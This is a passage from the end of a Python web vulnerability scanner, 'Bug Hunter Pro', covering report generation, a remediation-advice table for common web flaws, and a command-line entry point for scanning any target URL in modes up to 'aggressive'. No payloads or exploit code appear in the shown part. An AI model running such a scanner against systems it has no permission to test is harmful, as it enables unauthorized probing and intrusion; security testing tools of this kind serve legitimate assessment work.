        start_time = self.engine.stats.get("start_time")
        end_time = self.engine.stats.get("end_time", datetime.now())
        
        if start_time and end_time:
            duration = end_time - start_time
        else:
            duration = timedelta(0)
        
        summary = f"""
BUG HUNTER PRO - EXECUTIVE SUMMARY
==================================

Target: {self.engine.config.target}
Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Scan Duration: {duration}

OVERALL RISK ASSESSMENT
=======================

Total Findings: {len(findings)}

Severity Breakdown:
- CRITICAL: {len([f for f in findings if f.get('severity') == 'critical'])}
- HIGH: {len([f for f in findings if f.get('severity') == 'high'])}
- MEDIUM: {len([f for f in findings if f.get('severity') == 'medium'])}
- LOW: {len([f for f in findings if f.get('severity') == 'low'])}
- INFO: {len([f for f in findings if f.get('severity') == 'info'])}

TOP 5 CRITICAL FINDINGS:
"""
        
        critical_findings = [f for f in findings if f.get('severity') == 'critical']
        for i, finding in enumerate(critical_findings[:5], 1):
            summary += f"""
{i}. {finding.get('title', 'Unknown')}
   URL: {finding.get('url', 'N/A')}
   Description: {finding.get('description', 'No description')}
"""
        
        summary += f"""

RECOMMENDATIONS
===============

1. Immediately address all CRITICAL findings
2. Review and fix HIGH severity vulnerabilities within 7 days
3. Schedule remediation for MEDIUM severity findings
4. Monitor LOW and INFO findings for trends

NEXT STEPS
==========

1. Review detailed reports in the 'bug_hunter_reports' directory
2. Prioritize fixes based on risk assessment
3. Schedule follow-up scan after remediation
4. Consider implementing continuous security testing

Generated by Bug Hunter Pro v2.0
"""
        
        filename = f"{reports_dir}/executive_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(summary)
        
        print(f"    [✓] Executive summary saved: {filename}")
    
    def get_remediation_advice(self, vulnerability: str) -> str:
        """Get remediation advice for a vulnerability"""
        advice = {
            "SQL Injection": "Use parameterized queries/prepared statements. Implement input validation and output encoding.",
            "Cross-Site Scripting (XSS)": "Implement proper input validation and output encoding. Use Content Security Policy (CSP).",
            "Server-Side Request Forgery (SSRF)": "Validate and sanitize all user input. Use allow lists for URLs. Implement network segmentation.",
            "Local File Inclusion (LFI)": "Use allow lists for file paths. Avoid passing user input to file system operations.",
            "Remote Code Execution (RCE)": "Never execute user input as code. Use secure coding practices and sandboxing.",
            "XML External Entity (XXE) Injection": "Disable XML external entity processing. Use less complex data formats like JSON.",
            "Insecure Direct Object Reference (IDOR)": "Implement proper authorization checks. Use indirect object references.",
            "Open Redirect": "Validate redirect URLs against an allow list. Use relative URLs where possible.",
            "CRLF Injection": "Validate and encode user input. Use framework-specific sanitization functions.",
            "Host Header Injection": "Validate Host header. Use relative URLs or allow listed domains.",
            "API Information Disclosure": "Configure proper error handling. Disable detailed error messages in production.",
            "Missing Security Headers": "Implement security headers: HSTS, CSP, X-Frame-Options, etc."
        }
        
        for key in advice:
            if key.lower() in vulnerability.lower():
                return advice[key]
        
        return "Review the finding and implement appropriate security controls based on the application context."

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Bug Hunter Pro - Ultimate Web Application Security Assessment Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t https://example.com
  %(prog)s -t https://example.com -m deep -w 200
  %(prog)s -t https://example.com --wordlist custom_words.txt
  %(prog)s -t https://example.com --auth-token "Bearer jwt_token"
        
Report Formats: HTML, JSON, PDF, TXT
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("-m", "--mode", choices=["fast", "normal", "deep", "aggressive"], 
                       default="normal", help="Scan mode (default: normal)")
    parser.add_argument("-w", "--workers", type=int, default=100, 
                       help="Maximum concurrent workers (default: 100)")
    parser.add_argument("--timeout", type=int, default=30, 
                       help="Request timeout in seconds (default: 30)")
    parser.add_argument("--depth", type=int, default=3, 
                       help="Crawling depth (default: 3)")
    parser.add_argument("--wordlist", action="append", help="Custom wordlist files")
    parser.add_argument("--auth-token", help="Authentication token (Bearer/JWT)")
    parser.add_argument("--cookie", help="Cookie string (key=value; key2=value2)")
    parser.add_argument("--proxy", help="Proxy URL (http://proxy:8080)")
    parser.add_argument("--output", help="Custom output directory")
    
    args = parser.parse_args()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    # Create headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    if args.auth_token:
        headers["Authorization"] = args.auth_token
    
    # Create config
    config = ScanConfig(
        target=args.target,
        mode=ScanMode(args.mode),
        max_concurrent=args.workers,
        timeout=args.timeout,
        depth=args.depth,
        custom_wordlists=args.wordlist or [],
        auth_token=args.auth_token,
        cookies=cookies,
        headers=headers,
        proxy=args.proxy
    )
    
    # Create and run scanner
    scanner = BugHunterPro(config)
    await scanner.run_full_assessment()

if __name__ == "__main__":
    # Check for required packages
    required = ['aiohttp']
    missing = []
    
    for package in required:
        try:
            if package == 'aiohttp':
                import aiohttp
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[!] Missing required packages: {', '.join(missing)}")
        print(f"[!] Install with: pip install {' '.join(missing)}")
        sys.exit(1)
    
    # Run the scanner
    asyncio.run(main())
